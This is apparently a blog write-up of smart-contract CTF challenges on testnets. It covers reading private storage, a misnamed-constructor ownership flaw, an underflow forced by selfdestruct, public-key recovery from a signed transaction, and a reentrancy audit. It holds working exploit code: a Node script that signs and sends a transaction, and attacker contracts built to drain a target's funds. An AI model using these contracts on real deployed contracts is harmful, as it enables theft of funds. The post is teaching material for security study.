---
date: 2020-03-18 23:48:05
layout: post
title: Blockchain-Security(2)
subtitle: "Created by: 0xFlash"
description: >-
  Created by: 0xFlash
image: >-
  /assets/img/hackthebox/bitlab/blockchain2.png
optimized_image: >-
  /assets/img/hackthebox/bitlab/blockchain2.png
category: blog
tags:
  - SecurityBlockchain
  - SmartContract
  - web3
  - truffle
  - ganache
  - solidity
  - ctf
  - Theft_Money
author: Ahmed Amin
paginate: true
---

# Quick Intro

Hey Guys Welcome back again.
Today I'am gonna solve more challenges than that were in my pervious writeup that will learn you more aspects about securing blockchain development.
also in Auditing Section I will explain a very critical vulnerability occures in smart contracts that costes millions of millons of dollars for shakeholders.it will be so much fun and juiciy experience you will gain.
So Let's get start.

> prefer if you read the pervious writeup before go forward to this as it is base of this writeup.


# Guess the random number (300 Points)

Challenge Description: This time the number is generated based on a couple fairly random sources.

![image](/assets/img/hackthebox/bitlab/GuessNumPic.png)

```javascript

pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

```

the contract rewards 2 ether who can guess the correct number which can be passed to guess function.so lets analyze the important piece of code of that contract.

```javascript

pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }
```

we have an unsigned variable `uint8 answer` which store the number we try to guess. t
hen the constructor function `GuessTheRandomNumberChallenge()` which its called only once when the contract deployed to then network.
its payable function which can receive ethers, then the `answer variable` its value will be the default blockchain hashing algorithm of block.number and now all of those data get hashed by Keccak hash algorithm and then casting in `uint8` which mean the final result of that value will be from range `0-255`.

`block.number`: current block number which will store the full details about the current transaction the upon occures once function in contract get called.
`now`: current block timestamp which mean the occurrence date of that transaction.

although the randomess way that used to set initial random value to `answer variable` its not a proper way and you can predict , but this not the main problem of this challenge.

The nature of a public blockchain like Ethereum is that all data is replicated on all nodes. When you run a fully Ethereum node, you get the entire history of the blockchain from other nodes, starting from block #0 (the “genesis block”). Those blocks contain every transaction that has ever occurred in Ethereum. In fact, the security of the blockchain relies on the fact that all of these transactions are permanently, immutably, stored.

so in fact the public can read any (data , state variables) they want from blockchain transactions that located smart contracts storage.

so how we can spot the data we want to read on smart contract storage and can retrieve its informations.


first of all we need to understanding smart contract storage structure.

Ethereum smart contracts use an uncommon storage model.

Each smart contract running in the Ethereum Virtual Machine (EVM) maintains state in its own permanent storage. This storage can be thought of as a very large array, initially full of zeros. Each value in the array is 32-bytes wide, and there are `2**256-1` such values. A smart contract can read from or write to a value at any location.

![image](/assets/img/hackthebox/bitlab/storage.png)


Locating Fixed-Sized Values

 For known variables with fixed sizes, it makes sense to just give them reserved locations in storage. The Solidity programming language does that for us.
 
 lets check this sample of contract.

```javascript

pragma solidity ^0.4.21;

contract Storage {
    
    String superHero;  // slot index: 0
    
    uint256[2] a;     // slot index: 1-2

    struct Data {
        uint256 id;
        uint256 value;
    }

    Data b; // slot index: 3-4
}
```

In the above code:

    superHero is stored at slot 0. (Solidity’s term for a location within storage is a “slot.”)
    a is stored at slots 1, and 2 (one for each element of the array).
    c starts at slot 3 and consumes two slots, because the Data struct stores two 32-byte values.

These slots are determined at compile time, strictly based on the order in which the variables appear in the contract code. so in our contract we want to solve the the `answer variable` once the contract was deployed it will be located on smart contract 's storage on index location 0 based on its order in declartion upon  compile time runtime.

```javascript

pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;   // slot index: 0

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }
```

so now we know how easily we can spot the location of state variables on smart contrac storage , and then we need to retrieve. we can get easliy using web3 API package client , so we will write one line of code that will get the data we need.

# Exploit

```javascript
                          // getStorageAt expect two params (contractAddress , slotIndex)
await web3.eth.getStorageAt('0x3F7BfAd8B12369b77fF762dd19F05187d3aFEFbA' , 0 , (err , num) => console.log(web3.toDecimal(num))); // 205 
```
now you can submit your right number as I explained  how it can be done on previous writeup.

![image](/assets/img/hackthebox/bitlab/solveGuessNumPIc.png)

So prefer in developing contract any important data should be encrypted so that can't malicious user got it.

# Another Solution

Etherscan provide an easy way to inspect any transaction details we can view the deploy's transaction and get data that stored on smart contract storage

![image](/assets/img/hackthebox/bitlab/etherscanGuessNum.png)

Tap on State changes and check the initial storage data info that  represents the current state is updated when a transaction takes place on the network.

![image](/assets/img/hackthebox/bitlab/etherscan2GuessNum.png)


# Assume ownership (300 Points)

Challenge Description: To complete this challenge, become the owner.

![image](/assets/img/hackthebox/bitlab/ownerShipPic.png)


```javascript

pragma solidity ^0.4.21;

contract AssumeOwnershipChallenge {
    address owner;
    bool public isComplete;

    function AssumeOwmershipChallenge() public {
        owner = msg.sender;
    }

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}
```

this challenge you don't have to do any heavy work even to solve it , Glance you can solve it in blink of eye *_- , the problem briefly is that the constructor function is typed wrong `(contractName !== constructorFuncName)` that convert it from function can only executed once upon contract deployed  to a public function that can any one from public run and claim of ownership of that contract so simple and so dump challenge you think am I 'am right. , but you might not expect that this flaw has happend on realworld  case scenario.

# Rubixi Accident RealWorld case

```javascript

pragma solidity ^0.4.21;

contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```

from above this snippet of code we can see the constructor function `DynamicPyramid` its name not matched with Contract Name , so that convert it from a regular constructor function to public function can any one run it public and make them owner of contract so easily steal all fund. so pay a great attention to your constructor name when you write it so that not lose your crypto assets.

Solving this challenge all you have to do is to deploy the contract and call `AssumeOwmershipChallenge()` function.



# Retirement fund (500 Point)

Challenge Description: This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.W
I’ve committed 1 ether to the contract below, and `I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!`

![image](/assets/img/hackthebox/bitlab/RetirementFundPic.png)



```javascript

pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

}
```

from challenge's Description we can know that contract store `1 ether` and the owner of that contract will not premit anyone to withdraw that ether until 10 years get passed. so lets analyze contract code.

here we have constructor function stored `1 ether` in `startBalance variable`,  then we have `withdraw() function` that will fund with you that 1 ether
if 10 years if been passed otherwise will fund `only 10% from `1 ether` to caller of function `player`. of course we will not wait 10 years even to withdraw this damn 1 ether *__*` and also its only meant to executed by the owner of the contract. certainly there is another sneaky peaky way to steal all fund.

here we have an interesting function that migth accomplish our malicious intent

```javascript
pragma solidity ^0.4.21;

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
```

this function can be called by us `player` it only transfer all fund in contract if `withdrawn variable` is greater than but the problem is we already know that `startBalance variable` equal 1 ether and `address(this).balance`: `contract fund` is also equal 1 ether

```r
 withdrawn = 1 - 1 = 0 // shit
```

so we can't pass the require line `require(withdrawn > 0);` and then we can't transfer the money. but after some researching there is a way we can do it let able to the maxmimize or minimize value to any variable on contract that not handled with a secure way this vulnerability is occurs so much in smart contract world and it can cost millions of dollars if not mitigated well it called `integer overflow and integer underflow`

# integer overflow and integer underflow vulnerability

Integer overflows and underflows are not a new class of vulnerability, but they are especially dangerous in smart contracts. what we have here is an integer underflow vulnerability. if you know the normal odometer which calculates the distance of your car has traveled. This odometer goes from 000000 – 999999. This is why the moment you cross over to 1,000,000 km your odometer will revert back to 000000.

![image](/assets/img/hackthebox/bitlab/odmeter.jpg)

in programming we can revet the value to maximum value as odometer do in revert back to mimizing after exceeding limit.

# integer overflow problem

An overflow occurs when a number gets incremented above its maximum value. Suppose we declare an uint8 variable, which is an unsigned variable and can take up to 8 bits. This means that it can have decimal numbers between 0 and 2^8-1 = 255.

lets Keeping this in mind, consider the following example

```javascript
    uint8 a = 255;
    a++; // a become equal = 0
```
This will lead to an overflow because a’s maximum value is 255. solidity can handle up to 256-bit numbers. Incrementing by 1 would to an overflow situation This will lead to an overflow, because a’s maximum value is 255. that will make a value reset to `0` like odometer example.

# integer underflow problem

otherwise overflow  , underflow occures in opposite direction

```javascript
    uint8 a = 0;
    a--; // a become equal = 255
```

We just caused an underflow which will cause a to have the maximum possible value which is 255. The underflow error is more likely to happen than the overflow error, because it will be somehow  a chance that an attacker will end up with more tokens than he should actually have.

this accident occured in realworld that costs stakeholder approximately 2000 ETH which was worth ~$2.3 million.

so the idea that come to my mind is to make underflow `withdrawn variable`


```javascript
pragma solidity ^0.4.21;

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance; // let make this variable value to be maxmimiz 

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
```

so I need to abuse this minus operation `uint256 withdrawn = startBalance - address(this).balance` minus startBalance with number greater than `1`.
so I want to figure out a way that can increament contract fund to be bigger than 1 ether in order to reset that value to a maximize number and steal all the fund. unfortunately I want to increase the contract fund to be greater than 1 I forgot about that the contract's functions is not `payable` which mean as they can't receive ethers. so I was have to find a way that can force contract receive ether. after some researching I found a proper way to do that.

![image](/assets/img/hackthebox/bitlab/docSelf.png)

according to solidity documention  the contract that  performs the `selfdestruct` operation the remaining ether stored at that contract will to a designated target and then the storage and code is removed from the state.

so we can write a malicious contract that store `1 Ether` and then destroy its self by perform `selfdestruct` operation and set our the target  the contract we want to increase its fund to force it receive ethers so we can exploit underflow vulnerability and steal all the money.

# War Of Contracts ¯\_(ツ)_/¯

```javascript
pragma solidity ^0.4.21;

contract Exploit {
    
    constructor() payable public {
        require(msg.value == 1 ether); // fund contract with 1 Ether
    }
    
    function kill(address _victim) public { // set the receiver target to receive the expected ether
        selfdestruct(_victim);
    } 
    
}
```

so now will make contract attack another contract remotely after deploying it into the same network `(ropentest network)` that our target contract is locates in.

![image](/assets/img/hackthebox/bitlab/exploitCon.png)

now when we deploy the contract with initial fund `1 Ether` and call `kill()` function.

![image](/assets/img/hackthebox/bitlab/executexploit.png)

then then minus operation will take look like that.

```javascript
  uint256 withdrawn = startBalance - address(this).balance; // 1 - 2 = -1 since withdrawn unsigned varaible which means that it can't be ever a negative number so it will be positive maximum number
```

now we can load the victim contract and call the vulnerable `collectPenalty() function`. then we will be able to steal all the fund stored in that contract.

![image](/assets/img/hackthebox/bitlab/pwnCon.png)

now check the solution and you will see our malicious friend dancing like tiger shroff happy from thefting money :D

![image](/assets/img/hackthebox/bitlab/checkSol.png)


# Public Key (750 Points)

Challenge Description: Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.
To complete this challenge, find the public key for the owner’s account.

![image](/assets/img/hackthebox/bitlab/pubkeypic.png)


```javascript
pragma solidity ^0.4.21;

contract PublicKeyChallenge {
    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;
    bool public isComplete;

    function authenticate(bytes publicKey) public {
        require(address(keccak256(publicKey)) == owner);

        isComplete = true;
    }
}
```

this challenge is so interesting we only have here the account address of the owner of contract and ask us execute `authenticate function` if we know the public key of the owner and there isn't any other clue can help you much.

Lets abstract this problem into a few fragments and ask to our self the right questions that can help us overcome this challenge.
we only have owner address here so we can ask our self, how can ethereum addresses has been generated

this equation is meant to generate ethereum Private Key -> Public Key -> Ethereum Address  `first fragment`



-1 create a random private key using SHA256, Private keys are generated as random 256 bits, which is 64 (hex) characters or 32 bytes without prefix `0x`.
-2 Ethereum public keys (128 characters / 64 bytes) are created using an algorithm called Elliptic Curve Digital Signature Algorithm (ECDSA). Ethereum       uses secp256k1 to generate public keys. Public key is a point in this Elliptic curve algorithm.
-3 In order to create Ethereum Addresses, keccak256 algorithm is applied to the x and y points on public keys.



 
# Public Key:

>  -128 Hex Characters
>  -The public key corresponds to the private key created using the cryptographic functions.
>  -Public keys can be created using private keys; however, you can’t create Private keys from Public keys. (Public key generation is a one-way function)

# Private Key:

>  -Random 256 Bit, 64 Hex character number.
>  -Only known to the user who created it either through a library, or cryptographic hash functions.
>  -It is used to sign Ethereum transactions on the Blockchain.
>  -It shouldn’t be publicly shared because whoever owns the Private keys can access the funds for that address.
>  -Private keys are used to create Public addresses using SHA256 hash function

# ECDSA Algorithm Details:


# Technical Ethereum Address generation steps:

-Generate Private Key using open source libraries such as Ethereumj or SHA256 hash function with a randomly generated number.

> 0: Private Key: 08a810621c2a888a8f7f6ffcd7024f54ac1461fa6a86a4b545a8a1fa21c28866

-Generate Public key using ECDSA — secp256k1 — algorithm applied to Private Key. The public key is a point on the Elliptic Curve Algorithm. It has x and 

y coordinates which are used to crate Ethereum address.

> 1: Public Key: 048e66b3e548818ea2cb354fb70749f6c8de8fa484f7530fc447d5fe80a1c424e4f5ae648d648c980ae7095d1efad87161d83886ca4b6c498ac22a93da5099014a

-Apply keccak256 — Ethereum hash function — using x and y coordinates to create Ethereum address.

> 2: Ethereum Address: 0x00B54E93AA2EBA3086A55F4249873E291D1AB06C

`but we can't able to retrieve the owner private key we can try to generate public key within Elliptic curve Algorithm !!!!!!!!`

the second question we can ask to us that what transactions that were done using that account address `second fragment`

> Ethereum addresses are anonymous, meaning that nobody can know if the address belongs to a known person , but we can lookup on trasactions that were
done by specific address we want to collect all data we need that might help us generate his public key.

Etherscan can do to us this task so easily

![image](/assets/img/hackthebox/bitlab/getTrans.png)

so we find out that this account preformed 3 transactions on chain let's investigate one of them

![image](/assets/img/hackthebox/bitlab/trandetails.png)

we now garthed a little bit good information about our target , but a another good question to ask us that let us be closer more and more

How Transaction is produced first of all `third fragment`.

the power of blockchain comes from its solve the trustless and tampering issuess that is very populer in the cyber world. so there must need of private
and public key in every transaction happend we chain can verify securaly who and how transaction will be managed from the issuer on the chain
and that will gonna led us to other concept called Digital Signatures

# Digital Signatures

Each account in the Ethereum network has a public key and a private key. An Ethereum address is essentially a hashed version of the public key.
Accounts can use their private key to sign a piece of data, returning a signature of that data.

![image](/assets/img/hackthebox/bitlab/key.png)

so each trasaction produced in the chain, its embbed in it the digital signature of the signer. we can verify from our hypothesis and we can query all details we need on specific transaction  with one line of code.

```javascript
                          // getTransaction expect two params (TransactionHash)
await web3.eth.getTransaction('0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb' , (err , TxData) => console.log(TxData))

Object 
{ 
  blockHash: "0x487183cd9eed0970dab843c9ebd577e6af3e1eb7c9809d240c8735eab7cb43de", 
  blockNumber: 3015083, 
  from: "0x92b28647ae1f3264661f72fb2eb9625a89d88a31", 
  gas: 90000, 
  gasPrice: {…}, 
  hash: "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb", 
  input: "0x5468616e6b732c206d616e21", 
  nonce: 0, 
  r: "0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7", 
  s: "0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962", 
  v: "0x29"
}
```

behind the scene while the transaction is happing the blockchain verify from the integrity of data payload that will minined and appended into th chain

within those steps Recover the public key / address of the signer, and Verify the integrity of the message, that it is the same message that was signed by the signer.

Recovering public key process it must contain four essential element keys which they are the `encoded payload data , the digtial signature r , s , v` and that what we exactly have

so `Given a message (m) Superman's signature r , s  on that message, Flash can (potentially) recover Superman's public key.` 

so from this step we can hijack public key and generated with it a proper way the victim address 

> Note that an invalid signature, or a signature from a different message, will result in the recovery of an incorrect public key. The recovery algorithm can only be used to check validity of a signature if the signer's public key (or its hash) is known beforehand.

Actually I Am not a cryptographic Scientist like `allen turing` neither a cryptographic specialist. but fortunately their is a package that can do all heavy crytpographic stuff to us called `ethereumjs-tx`.

so now we have all we need in order to solve that challenge , I will teach how  could you write an automated exploit for solving that challenge that will make you learn low level stuffs about how transaction its produced that is the real purpos from that challenge instead using metamask that hide from us alot of stuffs to teach us about Blockchain EcoSystem.

first we need to use rpc gateway that will connect us to ethereum network which is called `INFURA.io`

![image](/assets/img/hackthebox/bitlab/infura.png)


make sure you proper configure your infura gateway as well choose ropsten network as we are playing in testing network

now run this script

```javascript
const Web3 = require('web3')
const rpcURL = '' // Your RPC URL goes here
const web3 = new Web3(rpcURL)
const address = '' // Your account address goes here
web3.eth.getBalance(address, (err, wei) => {
  balance = web3.utils.fromWei(wei, 'ether')
})
```

if every thing is running correctly as you configured it well you should be able to see your account balance in terminal successfully.
> Note that `ethereumjs-tx` expect that transaction payload to be in raw format and you get it from etherscan from this tap `Get Raw TxnHash`

![image](/assets/img/hackthebox/bitlab/rawTx.png)


# Exploit

now copy and paste the exploit I provided to you and change it with your rpcUrl, private key , public key ,  respectively


```javascript
const Web3 = require('web3')
const ethereumTx = require('ethereumjs-tx').Transaction

// connect to Infura node
const web3 = new Web3(new Web3.providers.HttpProvider('https://ropsten.infura.io/v3/yourtokenid'))

const YELLOW = "\033[93m"
const GREEN  = "\033[32m"
const Blue   = "\033[34m"
const Red    = "\033[31m"

const privKey = new Buffer('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' , 'hex') 
const player = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
const contractAdress = '0x3057D4d60aAB7b246E038D3732C48142EB98Adf8'

const abi = [{"constant": true,"inputs": [],"name": "isComplete","outputs": [{"name": "","type": "bool"}],"payable": false,"stateMutability": "view","type": "function"},{"constant": false,"inputs": [{"name": "publicKey","type": "bytes"}],"name": "authenticate","outputs": [],"payable": false,"stateMutability": "nonpayable","type": "function"}]

const contract = new web3.eth.Contract(abi, contractAdress)

console.log(Blue + '[*] get Transaction details..')

web3.eth.getTransaction('0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb').then(txData => {
    
    console.log(YELLOW + '[+] get our target victim address..')
    console.log('[+] transactions details..')
    console.log( txData)



    const targetAdress = String(txData.from).toLowerCase()
    
    //get raw transaction data
    
    rawTx = '0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962'

    console.log('[+] processing transaction args..')

    const Tx = new ethereumTx(rawTx , { chain: 'ropsten' })

    console.log('[+] extracting victim public key ..')

    const publicKey = "0x" + Tx.getSenderPublicKey().toString('hex');
    
    console.log('[+] get victim address from extracted public key ..')

    const addressMatch = "0x" + Tx.getSenderAddress().toString('hex') == targetAdress ? true : false

    if (addressMatch) {
        
        console.log('[+] great public key extracted successfully ..')

        web3.eth.getTransactionCount(player,'pending').then(nonce => {

            contract.methods.authenticate(publicKey).estimateGas().then(gas => {
                
                console.log('[+] prepare raw transaction ..')
                const rawTransaction = {
                    from: player,
                    to: contractAdress,
                    gas: web3.utils.toHex(gas),
                    gasPrice: web3.utils.toHex(web3.eth.getGasPrice()),
                    data: contract.methods.authenticate(publicKey).encodeABI(),
                    nonce: nonce
                }

                console.log('[+] raw transaction ..')

                console.log( rawTransaction)


    
                // signed your transaction
                const tx = new ethereumTx(rawTransaction , {'chain':'ropsten'});
                tx.sign(privKey)
    
    
                const serilaizeTx = tx.serialize();
                
    
                web3.eth.sendSignedTransaction('0x' + serilaizeTx.toString('hex'))
                .on('transactionHash' , hash => console.log('[+] Transaction Hash ..' + hash))
                .on('error', console.error)
    
            })

            contract.methods.isComplete().call((error , result) => {
                if(!error) {
                    if (result === true)  console.log(GREEN + '[*] Pwnd successfully ..')
                    else {
                        console.log(Red + 'Not yet ...')
                    }
                } else {
                    console.log(error)
                }
                
            })  

        })
        

    }

})
})
```

```javascript
node solve.js or what ever any name you choose to it
```

![image](/assets/img/hackthebox/bitlab/automate.png)



Prefer after playing with this script create your own one and don't hesitate to feel free to get touch with me and to tell me about your script idea so I can also learn from you.(⌐■-■)

that about solving some challenges ,now lets get jump into Auditing Contract Section


# Auditing Contract

Security Auditing Smart Contracts it is a very critical and essential role in blockchain development , because a very tiny flaw in a contract can cost losing of million of assets and money for stakeholders and also the nature of deployed contract its immuatble so infected contract will be vulnerable for ever. also blockchain will play a huge role in humanity life in the future so we can't ignore the change of the future we are going to it and have to be prepared well to face it with a save vision.





```javascript
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Store {
  
  address public owner;
  using SafeMath for uint256;
  mapping(address => uint) public balances;
  

  constructor() public payable {
      require(msg.value == 10 ether);
      owner = msg.sender;
  }


  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }


  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}

}

```
# Static analysis

we have a smart contract called store. which seems it meant to store users's money let's anaylze it.

```javascript
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Store {
  
  address public owner;
  using SafeMath for uint256;
  mapping(address => uint) public balances;
  

  constructor() public payable {
      require(msg.value == 10 ether);
      owner = msg.sender;
  }


  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

}

```

we have a constructor function that fund the  `10 Ether` contract on deploying stage and also set the ownership of it for the deployer. then we have a another `function donate` that premit users to store or donate some amount of money which eventually get stored in the contract. till right now that not seems too problem.


```javascript 
function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```


then we have a another `function balanceOf` that check the current balance that stored in the contract of a given address.then we have `function withdraw`
and this is maybe  our `Holy Grail` this function premit users to withdraw their exect amount of their fund in the contract and then update the state variable (their balance) by decreasing their balance with the amount of money they withdraw after sending the money and here is the problem.finally the contract have `fallback function` which gives advantage of that contract in receiving and sending ether.

```javascript
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```
the flaw in this function is that it uses `call()` function which is a `low level function that get used to send message or ether to another contract`.
> so it can talk to a another contract which it can be a malicious contract to invoke his functions and execute a malicious code written by the bad guys.
there also a big mistake that function do which it update the state variable after sending the money, but `what is that mean and how it that could be so dangerous` and that is the vulnerability I'am talking about today now is called Reentrancy.This class of bug can take many forms, and both of the major bugs that led to the DAO's collapse were bugs of this sort.


# Reentrancy Vulnerability

Actually this vulnerability can make a bad boy to retrieve all fund of any contract because of the design nature of that flow that written in so bad way.
this function invoked repeatedly over and over like a recursive function  bef`ore finishing it first execution`. I assume that you maybe the picture being to be clear to you now. `remember that I told you that the caller's balance have been updated after sending the money`. `follow me to the rabbit hole Come Neo Come firstly take the red pill :D`.

I will visualize to you  what happing in the expected way and also in a malicious way definitely

```javascript
//expected way

suppose you have 2 ether in your wallet the contract you want to store your money in it has 50 ether which is a great deal by the way :D

so you decide to donate with 1 ether so you called donate function with 1 ether 
: donate(1 ether) > contract.balance = 51

and then contract balance become 51 ether. 
then you need to return your money back after while you called withdraw function which check the your donation amount and return back to you your actual money then contract balance became 50 ether again
: withdraw(1 ether) > contract.balance = 50
```
```javascript
//malicious way

 you have 1 ether in your wallet the contract you want to store your money in it has 50 ether. and you are a badboy that want to steal all the money
 to live your life style you want. you know that `call()` can send money to smart contract so we can write smart contract that can receive ether remember
 the problem of that function can be invoked many times before first execution been finished
 so badboy can invoke withdraw function like that way

badboy's contract donate(1 ether) >> contract balance (ether 51) 

badboy's contract withdraw(1 ether) >> first execution >> 1 ether get send to the badboy contract >> contract balance (ether 50) 
then badboy's contract withdraw(1 ether) >> second execution >>>> first execution still not finished which mean that badboy 's contract donation amount still(1 ether) and not has been updated yet which the first condition to run withdraw function can still be bypassed
then then badboy's contract withdraw(1 ether) >> over and over before updating it balance state until the contract fund will be zero

badboy's contract balance = 51
victim contract balance   = 0

```

# conclusion

-1 A smart contract tracks the balance of a number of external addresses and allows users to retrieve funds with its public withdraw() function.
-2 A malicious smart contract uses the withdraw() function to retrieve its entire balance.
-3 The victim contract executes the call.value(amount)() low level function to send the ether to the malicious contract before updating the balance of       the malicious contract.
-4 The malicious contract has a payable fallback() function that accepts the funds and then calls back into the victim contract's withdraw() function.
-5 This second execution triggers a transfer of funds: remember, the balance of the malicious contract still hasn't been updated from the first           withdrawal. As a result, the malicious contract successfully withdraws its entire balance a second time.


# Dynamic analysis

let's deploy the contract in ganache network and playing with it . then we will write a malicious contract that will steal all the money of the vulnerable contract. we will use truffle framework like we done before.

![image](/assets/img/hackthebox/bitlab/deployStore.png)

now our vulnerable contract get deployed on address: `0x880cbeace7eba65f5c2c8d8eb3bc80155d180329`

```javascript
let Store   = artifacts.require('./Store.sol');

module.exports = deployer => {
                                                            //deploy contract with initial fund 10 ether
    deployer.deploy(Store , {from: web3.eth.accounts[0] , value: web3.toWei(10 , 'ether') , overwrite: false});
 
}
```  


now check  every thing go that right with you within interact with contract's functions go donate with one ether with a regular account and with draw it.

```javascript
async function execute(callback) {
    
    let vulnerableContract = await StoreContract.deployed();
    console.log(`Vulnerable contract address is : ${vulnerableContract.address}`);
    
    let owner = web3.eth.accounts[0]
    console.log(`owner address is ${owner}`)


    let OwnerBalance = await web3.fromWei(await web3.eth.getBalance(owner) , 'ether')
    console.log(`Owner balance is : ${OwnerBalance}`)


    victimContractInitialBalance = web3.fromWei(await web3.eth.getBalance(vulnerableContract.address), 'ether')
    console.log(`Initial victim's contract balance: ${victimContractInitialBalance} eth`)    


    let badBoy = web3.eth.accounts[1]
    console.log(`attacker address is ${badBoy}`)



    
    let AttackerBalance = web3.fromWei(await web3.eth.getBalance(badBoy) , 'ether' )
    console.log("badBoy account balance is :" + AttackerBalance)


    await vulnerableContract.donate(badBoy , {
        from: badBoy,
        value: web3.toWei(1, 'ether')

    })

    let AttackerDonation = await vulnerableContract.balanceOf(badBoy);

    console.log(`Attacker\'s Donation value is : ${web3.fromWei(AttackerDonation , 'ether')}` )


    let victimContractBalance = web3.fromWei(await web3.eth.getBalance(vulnerableContract.address) , 'ether' )

    console.log(`victim contract balance now ${victimContractBalance}`)

    await vulnerableContract.withdraw(web3.toWei(1, 'ether') , {
        from: badBoy,
    })

    console.log('check remote contract balance',web3.fromWei(await web3.eth.getBalance(vulnerableContract.address).toNumber(), 'ether'))
    console.log('check badboy balance',web3.fromWei(await web3.eth.getBalance(badBoy).toNumber(), 'ether'))


    callback()
}
```

![image](/assets/img/hackthebox/bitlab/playcon.png)


# war of contracts (pwn)

```javascript

pragma solidity ^0.4.18;

contract Store {
  
  mapping(address => uint) public balances;
  function donate(address _to) public payable {}
  function balanceOf(address _who) public view returns (uint balance) {}
  function withdraw(uint _amount) public {}

  function() public payable {}
}


contract Exploit {
    
    address public attacker;
    
    // point to our target contract 
    address target = 0x880cbeace7eba65f5c2c8d8eb3bc80155d180329;
    Store  Victim = Store(target);
    
    //set contract's ownership to our badboy 
    constructor()  {
        attacker = msg.sender;
    }

    modifier onlybadBoy {
        require(
            msg.sender == attacker,
            "caller is not the hacker"
        );
        _;
    }

    // our hackable function that call withdraw function in the vulnerable contract
    function Hack(uint _amount) public  {
        Victim.withdraw(_amount);
    }
    // function to trasnfer all the money in our contract to our account with only badboy privilege
    function getMyMoney() public onlybadBoy {
        msg.sender.transfer(this.balance);
    }
    // fallback function that make our contract recieve ethers and call hack function once it get executed 
    function() public payable {
        Hack(1 ether);
    }

}

```

let's break down each part of our malicious contract and know why it written in that way ¯\_(ツ)_/¯.

```javascript
    // point to our target contract 
    address target = 0x0a4a49363c93f5c05d51818837e0043c262105ec;
    Store  Victim = Store(target);
    
    //set contract's ownership to our badboy 
    constructor()  {
        attacker = msg.sender;
    }
```

we make our contract to point to the vulnerable contract and import all its functions as a interface to our malicious contract so it can visible to it and able to call each one this is popular way of make contract talk to another contract.

```javascript

    modifier onlybadBoy {
        require(
            msg.sender == attacker,
            "caller is not the hacker"
        );
        _;
    }

    // our hackable function that call withdraw function in the vulnerable contract
    function Hack(uint _amount) public  {
        Victim.withdraw(_amount);
    }
    // function to trasnfer all the money in our contract to our account with only badboy privilege
    function getMyMoney() public onlybadBoy {
        msg.sender.transfer(this.balance);
    }
    // fallback function that make our contract recieve ethers and call hack function once it get executed 
    function() public payable {
        Hack(1 ether);
    }

```

I assume that comments explains well what meant for each function of those , but I want to clear thing about the fallback role in this situation
